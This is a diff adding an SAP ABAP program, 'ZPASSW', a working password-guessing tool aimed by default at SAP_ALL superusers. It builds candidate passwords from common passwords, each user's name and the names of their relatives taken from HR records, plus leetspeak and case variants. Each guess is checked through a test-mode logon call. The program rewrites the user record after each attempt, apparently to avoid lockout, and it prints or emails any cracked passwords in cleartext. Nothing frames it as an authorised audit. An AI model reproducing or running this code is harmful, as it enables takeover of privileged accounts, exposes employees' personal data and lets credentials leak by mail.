@@ -1,0 +1,461 @@
+<?xml version="1.0" encoding="utf-8"?>
+<PROG NAME="ZPASSW" VARCL="X" SUBC="1" RMAND="001" RLOAD="S" FIXPT="X" UCCHECK="X">
+ <textPool>
+  <language SPRAS="S">
+   <textElement ID="R" ENTRY="Busca claves" LENGTH="12 "/>
+   <textElement ID="S" KEY="P_LOG" ENTRY="        Mostrar log" LENGTH="19 "/>
+   <textElement ID="S" KEY="P_MAIL" ENTRY="        Envío por mail" LENGTH="22 "/>
+   <textElement ID="S" KEY="P_PASS01" ENTRY="        Claves" LENGTH="14 "/>
+   <textElement ID="S" KEY="P_PASS02" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_PASS03" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_PASS04" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_PASS05" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_PASS06" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_PASS07" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_PASS08" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_PASS09" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_PASS10" LENGTH="0 "/>
+   <textElement ID="S" KEY="P_SAPALL" ENTRY="        Sólo usuario SAP_ALL" LENGTH="28 "/>
+   <textElement ID="S" KEY="S_GJAHR" ENTRY="D       ." LENGTH="17 "/>
+   <textElement ID="S" KEY="S_MONAT" ENTRY="        Ejercicio2" LENGTH="18 "/>
+   <textElement ID="S" KEY="S_NAME" ENTRY="D       ." LENGTH="16 "/>
+   <textElement ID="S" KEY="V_TIMES" ENTRY="        Contadores" LENGTH="18 "/>
+  </language>
+ </textPool>
+ <source>REPORT zdiccpwd.
+
+TABLES: adrp, usr21, usr02, bkpf.
+DATA: user(8).
+DATA: password LIKE xu400-newcode.
+
+DATA: user_logondata LIKE uslogond.
+DATA: user_name LIKE usr02-bname.
+DATA: old_key LIKE user_logondata-bcode.
+DATA: pwd_found,
+      v_ok.
+
+DATA: l_cont(4) TYPE c,
+      l_string  LIKE xu400-newcode,
+      l_string1 LIKE xu400-newcode,
+      l_string2 LIKE xu400-newcode,
+      l_string3 LIKE xu400-newcode,
+      l_string4 LIKE xu400-newcode.
+
+DATA: auth_rec LIKE ust04.
+DATA: auth_tab LIKE TABLE OF auth_rec.
+
+DATA: BEGIN OF usr_rec,
+        mandt LIKE usr02-mandt,
+        bname LIKE usr02-bname,
+        bcode LIKE usr02-bcode,
+        uflag LIKE usr02-uflag,
+      END OF usr_rec.
+DATA: usr_tab LIKE TABLE OF usr_rec.
+
+
+DATA: BEGIN OF pwd_rec,
+        string LIKE xu400-newcode,
+      END OF pwd_rec.
+DATA: BEGIN OF pwd_tab OCCURS 0,
+        string   LIKE xu400-newcode,
+        todos,
+        password,
+      END OF pwd_tab,
+      pwd_tab2      LIKE pwd_tab OCCURS 0,
+      v_gjahr_desde TYPE gjahr,
+      v_gjahr_hasta TYPE gjahr,
+      v_gjahr       TYPE gjahr,
+      v_monat_desde TYPE monat,
+      v_monat_hasta TYPE monat,
+      v_monat       TYPE monat,
+      i_texto       TYPE rspc_t_text.
+
+
+SELECT-OPTIONS: s_name FOR usr21-bname.
+PARAMETERS: p_sapall AS CHECKBOX DEFAULT &apos;X&apos;.
+PARAMETERS: v_times TYPE i DEFAULT 9.
+SELECT-OPTIONS: s_gjahr FOR bkpf-gjahr DEFAULT sy-datum(4) NO-EXTENSION,
+                s_monat FOR bkpf-monat DEFAULT sy-datum+2(2) NO-EXTENSION.
+PARAMETERS: p_pass01 LIKE xu400-newcode,
+            p_pass02 LIKE xu400-newcode,
+            p_pass03 LIKE xu400-newcode,
+            p_pass04 LIKE xu400-newcode,
+            p_pass05 LIKE xu400-newcode,
+            p_pass06 LIKE xu400-newcode,
+            p_pass07 LIKE xu400-newcode,
+            p_pass08 LIKE xu400-newcode,
+            p_pass09 LIKE xu400-newcode,
+            p_pass10 LIKE xu400-newcode.
+
+PARAMETERS: p_log  AS CHECKBOX,
+            p_mail TYPE text255.
+
+DEFINE docont.
+  l_string2 = l_string.
+  DO v_times TIMES.
+    l_cont = sy-index.
+    CONCATENATE l_string l_cont INTO pwd_tab-string.
+    CONDENSE pwd_tab-string NO-GAPS.
+    APPEND pwd_tab.
+    CONCATENATE l_string l_cont INTO pwd_tab-string SEPARATED BY &apos;-&apos;.
+    CONDENSE pwd_tab-string NO-GAPS.
+    APPEND pwd_tab.
+  ENDDO.
+
+  v_gjahr = v_gjahr_desde.
+  while v_gjahr &lt;= v_gjahr_hasta.
+    CONCATENATE l_string2 v_gjahr INTO pwd_tab-string.
+    CONDENSE pwd_tab-string NO-GAPS.
+    APPEND pwd_tab.
+    CONCATENATE l_string2 v_gjahr INTO pwd_tab-string SEPARATED BY &apos;-&apos;.
+    CONDENSE pwd_tab-string NO-GAPS.
+    APPEND pwd_tab.
+    add 1 to v_gjahr.
+  ENDWHILE.
+
+  v_monat = v_monat_desde.
+  while v_monat &lt;= v_monat_hasta.
+    CONCATENATE l_string2 v_monat INTO pwd_tab-string.
+    CONDENSE pwd_tab-string NO-GAPS.
+    APPEND pwd_tab.
+    CONCATENATE l_string2 v_monat INTO pwd_tab-string SEPARATED BY &apos;-&apos;.
+    CONDENSE pwd_tab-string NO-GAPS.
+    APPEND pwd_tab.
+    add 1 to v_monat.
+  ENDWHILE.
+
+END-OF-DEFINITION.
+
+DEFINE: addt.
+  CLEAR pwd_tab.
+  pwd_tab-string = &amp;1.
+  pwd_tab-todos  = &apos;X&apos;.
+  APPEND pwd_tab.
+  l_string = l_string1 = pwd_tab-string.
+  docont.
+
+  pwd_tab-string = &amp;1.
+  TRANSLATE pwd_tab-string TO UPPER CASE.
+  l_string = pwd_tab-string.
+  docont.
+
+  pwd_tab-string = &amp;1.
+  TRANSLATE pwd_tab-string TO LOWER CASE.
+  APPEND pwd_tab.
+  l_string = pwd_tab-string.
+  TRANSLATE l_string TO LOWER CASE.
+  docont.
+
+END-OF-DEFINITION.
+
+DEFINE: addp.
+  CLEAR pwd_tab.
+  pwd_tab-string = &amp;1.
+  TRANSLATE pwd_tab-string(1) TO UPPER CASE.
+  TRANSLATE pwd_tab-string+1 TO LOWER CASE.
+  APPEND pwd_tab.
+
+  CLEAR pwd_tab.
+  pwd_tab-string = &amp;1.
+  TRANSLATE pwd_tab-string TO UPPER CASE.
+  APPEND pwd_tab.
+  l_string = pwd_tab-string.
+  docont.
+  TRANSLATE pwd_tab-string TO LOWER CASE.
+  APPEND pwd_tab.
+  TRANSLATE l_string TO LOWER CASE.
+  docont.
+END-OF-DEFINITION.
+
+DEFINE: addtn.
+  IF NOT p_pass&amp;1 IS INITIAL.
+    addt: p_pass&amp;1.
+  ENDIF.
+END-OF-DEFINITION.
+
+READ TABLE s_gjahr INDEX 1.
+IF sy-subrc = 0.
+  v_gjahr_desde = s_gjahr-low.
+  IF s_gjahr-high IS INITIAL.
+    v_gjahr_hasta = s_gjahr-low.
+  ELSE.
+    v_gjahr_hasta = s_gjahr-high.
+  ENDIF.
+ENDIF.
+
+READ TABLE s_monat INDEX 1.
+IF sy-subrc = 0.
+  v_monat_desde = s_monat-low.
+  IF s_monat-high IS INITIAL.
+    v_monat_hasta = s_monat-low.
+  ELSE.
+    v_monat_hasta = s_monat-high.
+  ENDIF.
+ENDIF.
+
+addt: &apos;Pass&apos;, &apos;06071992&apos;, &apos;6071992&apos;, &apos;19920706&apos;, &apos;ADMIN&apos;, &apos;TS1MBHSS&apos;, &apos;SP3ED#UP&apos;, &apos;$1Pawd2&amp;&apos;, &apos;Support&apos;,
+      &apos;HEINEKEN&apos;, &apos;Inicial&apos;, &apos;Init&apos;, &apos;Password&apos;, &apos;VERANDER&apos;, &apos;Inicio&apos;, &apos;Ini&apos;, &apos;Sap&apos;, &apos;Abap&apos;, &apos;1234567&apos;, &apos;Abcdefgh&apos;,
+      &apos;AJAX&apos;, &apos;EXPORT&apos;, &apos;Valencia&apos;, &apos;Clave&apos;, &apos;Contrasena&apos;,
+      &apos;Enero&apos;, &apos;Febrero&apos;, &apos;Marzo&apos;, &apos;Abril&apos;, &apos;Mayo&apos;, &apos;Junio&apos;, &apos;Julio&apos;, &apos;Agosto&apos;, &apos;Septiembre&apos;, &apos;Octubre&apos;, &apos;Noviembre&apos;, &apos;Diciembre&apos;,
+      &apos;Ene&apos;, &apos;Feb&apos;, &apos;Mar&apos;, &apos;Abr&apos;, &apos;May&apos;, &apos;Jun&apos;, &apos;Jul&apos;, &apos;Ago&apos;, &apos;Sep&apos;, &apos;Oct&apos;, &apos;Nov&apos;, &apos;Dic&apos;,
+      &apos;Stadler&apos;, &apos;Vossloh&apos;,
+      &apos;123456&apos;, &apos;123456789&apos;, &apos;12345678&apos;, &apos;12345&apos;, &apos;111111&apos;, &apos;1234567&apos;, &apos;Qwerty&apos;, &apos;Admin&apos;, &apos;Welcome&apos;, &apos;666666&apos;, &apos;Abc123&apos;, &apos;123123&apos;,
+      &apos;654321&apos;, &apos;aa123456&apos;, &apos;Sothis&apos;, &apos;Seidor&apos;, &apos;Stratesys&apos;.
+
+addtn: 01, 02, 03, 04, 05, 06, 07, 08, 09, 10.
+
+SELECT mandt bname bcode uflag FROM usr02
+    APPENDING TABLE usr_tab
+  WHERE bname IN s_name.
+SORT usr_tab.
+
+DATA(pwd_tab_ini) = pwd_tab[].
+
+LOOP AT usr_tab INTO usr_rec.
+
+  pwd_tab[] = pwd_tab_ini[].
+  IF p_sapall = &apos;X&apos;.
+    SELECT SINGLE bname FROM ust04
+      INTO usr_rec-bname
+     WHERE bname   = usr_rec-bname
+       AND profile = &apos;SAP_ALL&apos;.
+    IF sy-subrc NE 0.
+      CONTINUE.
+    ENDIF.
+  ENDIF.
+
+  CALL FUNCTION &apos;SAPGUI_PROGRESS_INDICATOR&apos;
+    EXPORTING
+      text   = usr_rec-bname
+    EXCEPTIONS
+      OTHERS = 1.
+
+  CLEAR v_ok.
+
+  CALL FUNCTION &apos;SUSR_USER_LOGONDATA_GET&apos;
+    EXPORTING
+      user_name           = usr_rec-bname
+    IMPORTING
+      user_logondata      = user_logondata
+    EXCEPTIONS
+      user_name_not_exist = 1
+      OTHERS              = 2.
+
+  old_key = user_logondata-bcode.
+
+  DELETE pwd_tab WHERE todos = &apos;&apos;.
+
+  addp usr_rec-bname.
+
+  SELECT SINGLE * FROM usr21
+   WHERE bname = usr_rec-bname.
+
+  SELECT SINGLE * FROM adrp
+   WHERE persnumber = usr21-persnumber.
+
+  addp adrp-name_first.
+
+  SPLIT adrp-name_last AT &apos; &apos; INTO l_string3
+                                   l_string4.
+  addp l_string3.
+  addp l_string4.
+
+  CONCATENATE adrp-name_first(1) l_string3 INTO l_string.
+  addp l_string.
+
+  CONCATENATE adrp-name_first l_string3(1) l_string4(1) INTO l_string.
+  addp l_string.
+
+  CONCATENATE adrp-name_first(1) l_string3(1) l_string4(1) INTO l_string.
+  addp l_string.
+
+  DATA: l_pernr TYPE persno.
+  SELECT SINGLE pernr FROM pa0105
+    INTO l_pernr
+   WHERE ( usrid_long = usr_rec-bname
+      OR   usrid = usr_rec-bname )
+     AND endda &gt;= sy-datum
+     AND begda &lt;= sy-datum.
+  IF sy-subrc = 0.
+    SELECT favor FROM pa0021
+      INTO l_string
+     WHERE pernr = l_pernr.
+      addp l_string.
+    ENDSELECT.
+  ENDIF.
+
+
+  SORT pwd_tab.
+  DELETE ADJACENT DUPLICATES FROM pwd_tab.
+  DELETE pwd_tab WHERE string = &apos;&apos;.
+
+  pwd_tab2[] = pwd_tab[].
+  LOOP AT pwd_tab2 INTO pwd_tab.
+    DO 3 TIMES.
+      REPLACE &apos;i&apos; WITH &apos;1&apos; INTO pwd_tab-string.
+      REPLACE &apos;I&apos; WITH &apos;1&apos; INTO pwd_tab-string.
+      REPLACE &apos;o&apos; WITH &apos;0&apos; INTO pwd_tab-string.
+      REPLACE &apos;O&apos; WITH &apos;0&apos; INTO pwd_tab-string.
+      REPLACE &apos;a&apos; WITH &apos;@&apos; INTO pwd_tab-string.
+      REPLACE &apos;A&apos; WITH &apos;@&apos; INTO pwd_tab-string.
+    ENDDO.
+    APPEND pwd_tab.
+  ENDLOOP.
+
+  pwd_tab2[] = pwd_tab[].
+  LOOP AT pwd_tab2 INTO pwd_tab.
+    TRANSLATE pwd_tab-string(1) TO UPPER CASE.
+    TRANSLATE pwd_tab-string+1 TO LOWER CASE.
+    APPEND pwd_tab.
+
+    TRANSLATE pwd_tab-string TO LOWER CASE.
+    APPEND pwd_tab.
+    TRANSLATE pwd_tab-string TO UPPER CASE.
+    APPEND pwd_tab.
+  ENDLOOP.
+
+  pwd_tab2[] = pwd_tab[].
+  LOOP AT pwd_tab2 INTO pwd_tab.
+    l_string = pwd_tab-string.
+    CONCATENATE pwd_tab-string &apos;123&apos; INTO pwd_tab-string.
+    APPEND pwd_tab.
+
+    CONCATENATE l_string &apos;-123&apos; INTO pwd_tab-string.
+    APPEND pwd_tab.
+  ENDLOOP.
+
+  SORT pwd_tab.
+  DELETE ADJACENT DUPLICATES FROM pwd_tab.
+
+  LOOP AT pwd_tab INTO pwd_rec.
+    PERFORM tryout USING usr_rec-bname pwd_rec-string.
+    IF v_ok = &apos;X&apos;.
+      EXIT.
+    ENDIF.
+  ENDLOOP.
+
+  IF v_ok IS INITIAL.
+    APPEND |Usuario: { usr_rec-bname } No se ha encontrado| TO i_texto.
+  ENDIF.
+ENDLOOP.
+
+IF NOT p_mail IS INITIAL.
+  zcl_ap_envio_mail=&gt;mail( subject = &apos;Búsqueda&apos; direccion = p_mail i_textos = i_texto ).
+ENDIF.
+
+*---------------------------------------------------------------------*
+*       FORM TRYOUT                                                   *
+*---------------------------------------------------------------------*
+FORM tryout USING user_name LIKE usr02-bname
+                  password  LIKE xu400-newcode.
+
+  DATA: new_key LIKE user_logondata-bcode.
+
+  IF p_log = &apos;X&apos;.
+    WRITE: / user_name, password.
+  ENDIF.
+
+  SELECT SINGLE * FROM usr02
+   WHERE bname = user_name.
+  CHECK sy-subrc  = 0.
+
+*   CALL FUNCTION &apos;SUSR_USER_PASSWORD_PUT&apos;
+*     EXPORTING
+*       user_name            = user_name
+*       password             = password
+*     EXCEPTIONS
+*       user_name_not_exist  = 1
+*       password_not_allowed = 2
+*       passwords_not_equal  = 3
+*       OTHERS               = 4.
+
+
+*   CALL FUNCTION &apos;SUSR_LOGIN_CHECK_RFC&apos;
+*     EXPORTING
+*       bname                     = user_name
+*       password                  = password
+**      XBCODE                    = XBCODE
+**      XCODVN                    = XCODVN
+**      USE_NEW_EXCEPTION         = 0
+*     EXCEPTIONS
+*       wait                      = 1
+*       user_locked               = 2
+*       user_not_active           = 3
+*       password_expired          = 4
+*       wrong_password            = 5
+*       no_check_for_this_user    = 6
+*       password_attempts_limited = 7
+*       internal_error            = 8.
+
+
+  DATA: pwdstate  TYPE xupwdstate,
+        bname     LIKE rsyst-bname,
+        passwordx LIKE rsyst-bcode.
+
+  bname = user_name.
+  passwordx = password.
+  CALL &apos;INTERNET_USER_LOGON&apos;  ID &apos;AUTHTYPE&apos;  FIELD &apos;P&apos;   &quot;password
+                              ID &apos;TESTMODE&apos;  FIELD &apos;X&apos;
+                              ID &apos;UNAME&apos;     FIELD bname
+                              ID &apos;PASSW&apos;     FIELD passwordx
+                              ID &apos;PASSFLAG&apos;  FIELD pwdstate.
+  IF sy-subrc = 0.
+    CALL FUNCTION &apos;SUSR_USER_LOGONDATA_GET&apos;
+      EXPORTING
+        user_name           = user_name
+      IMPORTING
+        user_logondata      = user_logondata
+      EXCEPTIONS
+        user_name_not_exist = 1
+        OTHERS              = 2.
+
+    IF sy-subrc = 0.
+      new_key = user_logondata-bcode.
+
+      IF old_key = new_key.
+        v_ok = &apos;X&apos;.
+        PERFORM show_user USING password.
+      ENDIF.
+    ENDIF.
+  ENDIF.
+
+*   UPDATE usr02
+*     SET uflag = 0
+*         locnt = 0
+*         pwdlockdate = &apos;00000000&apos;
+*    WHERE bname = user_name.
+
+  MODIFY usr02 FROM usr02.
+  COMMIT WORK AND WAIT.
+
+ENDFORM.&quot;tryout
+
+*&amp;---------------------------------------------------------------------*
+*&amp;      Form  show_user
+*&amp;---------------------------------------------------------------------*
+FORM show_user USING password.
+  DATA l_bloq TYPE string.
+
+  WRITE: / &apos;Usuario   :&apos;, usr_rec-bname.
+  WRITE: / &apos;Password  :&apos;, password.
+  WRITE: / &apos;Status    :&apos;.
+  IF usr_rec-uflag = 0.
+    WRITE: &apos;no bloqueado&apos;.
+  ELSE.
+    WRITE: &apos;bloqueado&apos;.
+    l_bloq = &apos;BLOQUEADO&apos;.
+  ENDIF.
+  SELECT * FROM ust04 INTO TABLE auth_tab
+    WHERE bname = usr_rec-bname.
+  WRITE: / &apos;Profiles  :&apos;.
+  LOOP AT auth_tab INTO auth_rec.
+    WRITE auth_rec-profile.
+  ENDLOOP.
+  ULINE.
+  CLEAR pwd_found.
+
+
+  APPEND |Usuario: { usr_rec-bname } Password { password } { l_bloq }| TO i_texto.
+
+ENDFORM.&quot; show_user</source>
+</PROG>
